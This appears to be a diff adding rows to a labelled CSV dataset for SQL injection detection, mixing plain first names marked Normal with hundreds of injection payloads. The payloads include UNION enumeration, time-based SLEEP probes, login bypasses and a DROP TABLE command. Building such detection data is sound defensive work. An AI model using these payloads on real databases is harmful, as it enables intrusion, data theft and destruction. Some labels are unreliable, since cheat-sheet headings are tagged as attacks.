+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2'",SQL Injection
+'Jill',Normal
+'%' AND 8310=8310 AND '%'='',SQL Injection
+'Hank',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#'",SQL Injection
+'Bob',Normal
+'Alice',Normal
+'Fran',Normal
+'Bob',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'",SQL Injection
+'ORDER BY 19--',SQL Injection
+'Bob',Normal
+'Grace',Normal
+"'AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'",SQL Injection
+'Bob',Normal
+'Jill',Normal
+'John',Normal
+'OR 3409=3409 AND ('pytW' LIKE 'pytY',SQL Injection
+'John',Normal
+'Fran',Normal
+'Eve',Normal
+'Hank',Normal
+'Eve',Normal
+'Fran',Normal
+',SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#'",SQL Injection
+'HAVING 1=0',SQL Injection
+'Hank',Normal
+'Hank',Normal
+'Eve',Normal
+'Alice',Normal
+"'ORDER BY 1,SLEEP(5),3,4#'",SQL Injection
+'David',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#'",SQL Injection
+'or SLEEP(5)='',SQL Injection
+'Grace',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL--'",SQL Injection
+'Fran',Normal
+'Hank',Normal
+'Eve',Normal
+'ORDER BY 30',SQL Injection
+'Alice',Normal
+"'""""));",SQL Injection
+'Alice',Normal
+'&&SLEEP(5)--',SQL Injection
+'Hank',Normal
+'Charlie',Normal
+'Charlie',Normal
+'John',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#'",SQL Injection
+'Eve',Normal
+'Bob',Normal
+'Bob',Normal
+"'""""-""""'",SQL Injection
+'AND 1=0--',SQL Injection
+';',SQL Injection
+'Jill',Normal
+'Grace',Normal
+'Fran',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
+"'and (select substring(@@version,3,1))='c''",SQL Injection
+'ORDER BY 20--',SQL Injection
+Microservice running on port 7564,Normal
+'Charlie',Normal
+"''\""""'",SQL Injection
+'David',Normal
+"'and (select substring(@@version,1,1))='M''",SQL Injection
+'Grace',Normal
+'Charlie',Normal
+''=0--+',SQL Injection
+'John',Normal
+'OR 3409=3409 AND ('pytW' LIKE 'pytY',SQL Injection
+'Bob',Normal
+'Jill',Normal
+'Bob',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--'",SQL Injection
+'John',Normal
+'admin' or '1'='1'/*',SQL Injection
+"'OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))'",SQL Injection
+'Charlie',Normal
+"'"""")) or ((""""x""""))=((""""x'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#'",SQL Injection
+'Grace',Normal
+'Hank',Normal
+'ORDER BY 15--',SQL Injection
+'Hank',Normal
+'Alice',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'",SQL Injection
+'Grace',Normal
+'Alice',Normal
+'pg_SLEEP(5)',SQL Injection
+'Jill',Normal
+'John',Normal
+'David',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--'",SQL Injection
+'Bob',Normal
+'Alice',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6'",SQL Injection
+'OR x=x--',SQL Injection
+'Eve',Normal
+'Alice',Normal
+'Grace',Normal
+'Charlie',Normal
+'Grace',Normal
+''; DROP TABLE users; --',SQL Injection
+''&'',SQL Injection
+'David',Normal
+'David',Normal
+'Charlie',Normal
+'David',Normal
+'Bob',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12'",SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))'",SQL Injection
+'David',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17'",SQL Injection
+'Fran',Normal
+'UNION ALL SELECT 1',SQL Injection
+'ORDER BY 31337#',SQL Injection
+'John',Normal
+'Fran',Normal
+'David',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--'",SQL Injection
+'John',Normal
+'admin' or '1'='1'#',SQL Injection
+'David',Normal
+'Charlie',Normal
+'Jill',Normal
+'Fran',Normal
+"'"""" or true--'",SQL Injection
+'Fran',Normal
+"'1234 """" AND 1=0 UNION ALL SELECT """"admin"""", """"81dc9bdb52d04dc20036dbd8313ed055'",SQL Injection
+'Fran',Normal
+'John',Normal
+'Bob',Normal
+'Jill',Normal
+'Grace',Normal
+'John',Normal
+"'' AND MID(VERSION(),1,1) = '5';'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--'",SQL Injection
+'Bob',Normal
+'Hank',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12'",SQL Injection
+'John',Normal
+'Bob',Normal
+'ORDER BY 31337#',SQL Injection
+'Bob',Normal
+"'ORDER BY 1,SLEEP(5)#'",SQL Injection
+'Hank',Normal
+'Alice',Normal
+'Eve',Normal
+'Grace',Normal
+'John',Normal
+'OR x=y',SQL Injection
+"'' or """"'",SQL Injection
+'Fran',Normal
+'John',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#'",SQL Injection
+"'') or benchmark(10000000,MD5(1))#'",SQL Injection
+'Fran',Normal
+'UNION ALL SELECT SLEEP(5)--',SQL Injection
+'Jill',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'",SQL Injection
+'ORDER BY 24--',SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16'",SQL Injection
+'Bob',Normal
+'Alice',Normal
+'Hank',Normal
+'Bob',Normal
+'Grace',Normal
+'Alice',Normal
+'Alice',Normal
+'John',Normal
+'Hank',Normal
+'Charlie',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21'",SQL Injection
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'Grace',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--'",SQL Injection
+'Jill',Normal
+'David',Normal
+"'"""" or sleep(5)#'",SQL Injection
+'Bob',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'",SQL Injection
+'John',Normal
+'Eve',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'",SQL Injection
+'Jill',Normal
+'John',Normal
+"'admin"""") or (""""1""""=""""1""""#'",SQL Injection
+"'' or """"'",SQL Injection
+'Grace',Normal
+''''''''''''''UNION SELECT '2',SQL Injection
+'Eve',Normal
+'Finding the table name',SQL Injection
+'Bob',Normal
+'Bob',Normal
+'Grace',Normal
+'John',Normal
+'David',Normal
+'Grace',Normal
+'admin' or 1=1#',SQL Injection
+'ORDER BY 8#',SQL Injection
+'Grace',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18'",SQL Injection
+'David',Normal
+'Eve',Normal
+'AND 7300=7300 AND ('pKlZ'='pKlZ',SQL Injection
+'Hank',Normal
+'Grace',Normal
+'Alice',Normal
+'John',Normal
+'Alice',Normal
+'David',Normal
+'Bob',Normal
+'Jill',Normal
+'Alice',Normal
+'ORDER BY 24',SQL Injection
+'%' AND 8310=8310 AND '%'='',SQL Injection
+'' or ''*'',SQL Injection
+'Grace',Normal
+"'-1 UNION SELECT 1 INTO @,@,@'",SQL Injection
+'ORDER BY 28#',SQL Injection
+'Jill',Normal
+'Hank',Normal
+'Bob',Normal
+'Fran',Normal
+'(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--',SQL Injection
+'Bob',Normal
+'Hank',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#'",SQL Injection
+'Alice',Normal
+'Jill',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#'",SQL Injection
+'Bob',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'",SQL Injection
+'') or sleep(5)='',SQL Injection
+'David',Normal
+'ORDER BY 18',SQL Injection
+'Jill',Normal
+'admin' or 1=1--',SQL Injection
+'ORDER BY 14#',SQL Injection
+'Grace',Normal
+'1' ORDER BY 2--+',SQL Injection
+'Bob',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9'",SQL Injection
+'John',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'",SQL Injection
+'Bob',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14--'",SQL Injection
+''='',SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
+'Fran',Normal
+'Charlie',Normal
+'Grace',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'",SQL Injection
+'AND 1=1--',SQL Injection
+'Grace',Normal
+'Charlie',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14'",SQL Injection
+'Fran',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#'",SQL Injection
+'Eve',Normal
+'Alice',Normal
+'David',Normal
+'Grace',Normal
+'Eve',Normal
+'Time-Based:',SQL Injection
+'Bob',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21'",SQL Injection
+'Jill',Normal
+'Alice',Normal
+'Bob',Normal
+"'""""""""'",SQL Injection
+'UNION ALL SELECT 'INJ'||'ECT'||'XXX'#',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8--'",SQL Injection
+"'"""" """"'",SQL Injection
+'Alice',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL--'",SQL Injection
+'Jill',Normal
+'Bob',Normal
+'HAVING 1=0#',SQL Injection
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL--'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12--'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
+'John',Normal
+'waitfor delay '00:00:05'#',SQL Injection
+"'UNION ALL SELECT 1,2#'",SQL Injection
+'(SELECT * FROM (SELECT(SLEEP(5)))ecMj)',SQL Injection
+'John',Normal
+'IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--',SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9--'",SQL Injection
+'Fran',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+''));,SQL Injection
+'Charlie',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14--'",SQL Injection
+'AS INJECTX WHERE 1=1 AND 1=1',SQL Injection
+'Eve',Normal
+'Charlie',Normal
+'Charlie',Normal
+'ORDER BY 31337#',SQL Injection
+'John',Normal
+"'admin"""") or (""""1""""=""""1""""--'",SQL Injection
+'Bob',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))'",SQL Injection
+'Alice',Normal
+'David',Normal
+'Bob',Normal
+'Bob',Normal
+'John',Normal
+'Grace',Normal
+'John',Normal
+'ORDER BY 24#',SQL Injection
+'admin' or '1'='1'/*',SQL Injection
+'' OR EXISTS(SELECT * FROM users WHERE name = 'admin') --',SQL Injection
+"'UNION ALL SELECT 1,2,3#'",SQL Injection
+'John',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12'",SQL Injection
+'Fran',Normal
+'Alice',Normal
+'1)) or sleep(5)#',SQL Injection
+'Bob',Normal
+'Charlie',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))--'",SQL Injection
+'Eve',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--'",SQL Injection
+'Charlie',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11--'",SQL Injection
+'pg_SLEEP(5)#',SQL Injection
+'Bob',Normal
+'AND 1=0#',SQL Injection
+'Fran',Normal
+'Fran',Normal
+"'UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL--'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'",SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))--'",SQL Injection
+'John',Normal
+'David',Normal
+'John',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16'",SQL Injection
+'Alice',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6--'",SQL Injection
+'Jill',Normal
+'John',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18'",SQL Injection
+'Bob',Normal
+'/*  	C-style comment',SQL Injection
+"'""""*""""'",SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--'",SQL Injection
+'Hank',Normal
+'1)) or sleep(5)#',SQL Injection
+'David',Normal
+'Alice',Normal
+'Jill',Normal
+'Charlie',Normal
+'Eve',Normal
+'ORDER BY 1',SQL Injection
+'Charlie',Normal
+'Fran',Normal
+'Fran',Normal
+'Eve',Normal
+'John',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'",SQL Injection
+'Bob',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#'",SQL Injection
+'Bob',Normal
+'Jill',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))'",SQL Injection
+'Bob',Normal
+'Fran',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--'",SQL Injection
+'Grace',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9'",SQL Injection
+'Hank',Normal
+"'"""") or (""""x"""")=(""""x'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7'",SQL Injection
+'Fran',Normal
+'Charlie',Normal
+'Fran',Normal
+'John',Normal
+'Eve',Normal
+'John',Normal
+'Charlie',Normal
+'Jill',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#'",SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13'",SQL Injection
+'Grace',Normal
+"'""""));",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24'",SQL Injection
+'Bob',Normal
+'Bob',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10'",SQL Injection
+'Hank',Normal
+''',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#'",SQL Injection
+'Hank',Normal
+'1' ORDER BY 2--+',SQL Injection
+'Alice',Normal
+'Charlie',Normal
+'Hank',Normal
+'Eve',Normal
+'Eve',Normal
+'David',Normal
+'John',Normal
+'ORDER BY 24--',SQL Injection
+';,SQL Injection
+'Alice',Normal
+'David',Normal
+'Bob',Normal
+'Jill',Normal
+'Grace',Normal
+'Fran',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'Jill',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'",SQL Injection
+'Charlie',Normal
+"'"""" or pg_sleep(5)--'",SQL Injection
+'ORDER BY 23',SQL Injection
+'Bob',Normal
+'Eve',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#'",SQL Injection
+'John',Normal
+'John',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11--'",SQL Injection
+"'UNION ALL SELECT 1,2'",SQL Injection
+'Fran',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#'",SQL Injection
+'# Numeric',SQL Injection
+'Eve',Normal
+'John',Normal
+'Eve',Normal
+'Hank',Normal
+"'"""" or """"""""&""""'",SQL Injection
+'Hank',Normal
+'Eve',Normal
+'UNION ALL SELECT 'INJ'||'ECT'||'XXX'--',SQL Injection
+'1 AND (SELECT * FROM Users) = 1',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--'",SQL Injection
+'Grace',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#'",SQL Injection
+'Bob',Normal
+'Jill',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#'",SQL Injection
+'Hank',Normal
+'Fran',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#'",SQL Injection
+'OR x=y#',SQL Injection
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+"'SLEEP(1)/*' or SLEEP(1) or '"""" or SLEEP(1) or """"*/'",SQL Injection
+'Alice',Normal
+'ORDER BY 14#',SQL Injection
+'Hank',Normal
+'' GROUP BY columnnames having 1=1 --',SQL Injection
+'Eve',Normal
+'John',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))'",SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'",SQL Injection
+'ORDER BY 30',SQL Injection
+"'-1 UNION SELECT 1 INTO @,@,@'",SQL Injection
+'ORDER BY 4#',SQL Injection
+'John',Normal
+'admin' or '1'='1'/*',SQL Injection
+'ORDER BY 6#',SQL Injection
+'(SELECT * FROM (SELECT(SLEEP(5)))ecMj)',SQL Injection
+'Jill',Normal
+'David',Normal
+'Alice',Normal
+'Alice',Normal
+'Fran',Normal
+'Alice',Normal
+'or SLEEP(5)#',SQL Injection
+'admin') or ('1'='1'#',SQL Injection
+'Charlie',Normal
+'Hank',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9'",SQL Injection
+'Grace',Normal
+"'admin"""") or (""""1""""=""""1""""/*'",SQL Injection
+"'admin"""" or 1=1'",SQL Injection
+'John',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4--'",SQL Injection
+'Bob',Normal
+'Bob',Normal
+'David',Normal
+'Hank',Normal
+'ORDER BY SLEEP(5)--',SQL Injection
+'Eve',Normal
+'Fran',Normal
+'Alice',Normal
+'Fran',Normal
+'Alice',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))--'",SQL Injection
+'Bob',Normal
+'Grace',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15'",SQL Injection
+'Alice',Normal
+'ORDER BY 11--',SQL Injection
+'Charlie',Normal
+'Jill',Normal
+'Hank',Normal
+'David',Normal
+'ORDER BY 18',SQL Injection
+'Charlie',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))--'",SQL Injection
+'John',Normal
+'Alice',Normal
+'Alice',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--'",SQL Injection
+'Fran',Normal
+'Alice',Normal
+'Hank',Normal
+"'admin"""") or (""""1""""=""""1""""#'",SQL Injection
+"'ORDER BY 1,SLEEP(5)#'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#'",SQL Injection
+'Fran',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--'",SQL Injection
+'Charlie',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#'",SQL Injection
+'Fran',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--'",SQL Injection
+"'admin""""/*'",SQL Injection
